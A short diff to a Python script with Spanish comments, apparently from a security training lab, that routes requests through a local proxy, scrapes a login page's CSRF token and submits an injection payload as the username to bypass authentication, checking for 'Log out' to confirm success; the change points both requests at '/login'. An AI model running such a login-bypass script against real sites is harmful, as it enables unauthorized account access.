@@ -12,7 +12,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #Elimina el 
 proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def get_csrf_token(s, url):
-    r = s.get(url, verify=False, proxies=proxy)
+    r = s.get(url + "/login", verify=False, proxies=proxy)
     soup = BeautifulSoup(r.text, 'html.parser')
     csrf = soup.find("input")['value']
     return csrf
@@ -22,7 +22,7 @@ def exploit_bypasslogin(s, url, payload):
     data = {"csrf": csrf,
             "username": payload,
             "password": "noimportaquehayaqui"}
-    r = s.post(url, data=data, verify=False, proxies=proxy)
+    r = s.post(url + "/login", data=data, verify=False, proxies=proxy)
     res = r.text
     if "Log out" in res: #el texto "Log out" aparece solo si se ha iniciado sessión con exito
         return True
